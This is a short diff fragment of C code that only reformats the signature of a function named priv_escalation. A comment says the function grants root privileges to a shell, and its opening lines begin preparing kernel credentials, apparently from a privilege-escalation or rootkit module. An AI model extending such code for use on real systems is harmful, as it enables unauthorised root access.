@@ -4,7 +4,8 @@
 #include "include.h"
 
 /* Function to issue the root privileges for shell */
-void priv_escalation(void)
+void
+priv_escalation (void)
 {
 	struct task_struct *process;
         struct cred *pcred = prepare_creds();
